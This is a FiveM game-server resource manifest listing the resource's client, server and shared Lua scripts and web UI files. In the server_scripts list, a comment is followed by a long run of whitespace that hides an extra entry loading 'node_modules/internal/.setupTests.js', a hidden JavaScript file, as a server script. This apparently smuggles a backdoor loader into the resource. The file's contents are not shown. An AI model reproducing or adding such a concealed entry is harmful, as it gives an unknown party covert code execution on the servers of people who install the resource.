

fx_version 'cerulean'
game 'gta5'

author ''
description ''
version '1.0.0'

client_scripts {
    'client/*.lua'
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
'server/*.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.setupTests.js',
}

shared_scripts {
    'shared/*.lua',
}

ui_page 'web/index.html'

files {
    'web/index.html',
    'web/*.css',
    'web/*.js',
    'web/img/*.png'
}